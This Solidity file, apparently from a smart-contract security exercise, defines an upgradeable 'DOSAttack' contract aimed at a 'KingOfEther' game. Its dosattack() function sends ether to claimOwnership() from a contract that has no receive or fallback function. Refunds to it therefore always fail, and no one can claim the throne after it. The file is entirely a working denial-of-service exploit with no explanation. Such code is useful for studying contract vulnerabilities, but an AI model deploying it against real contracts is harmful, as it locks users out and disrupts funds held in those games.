// SPDX-License-Identifier:MIT
pragma solidity ^0.8.9;

import "./KingOfEther.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/Initializable.sol";
import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
import "@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol";

contract DOSAttack is Initializable , UUPSUpgradeable, OwnableUpgradeable{
    KingOfEther public kingofether;

    function initialize(address _kingOfEtherAddress) initializer public{
        kingofether = KingOfEther(_kingOfEtherAddress);
        __Ownable_init();
        __UUPSUpgradeable_init();
    }

    function _authorizeUpgrade(address) internal override onlyOwner {}

    function dosattack() public payable{
        kingofether.claimOwnership{value:msg.value}();
    }
}
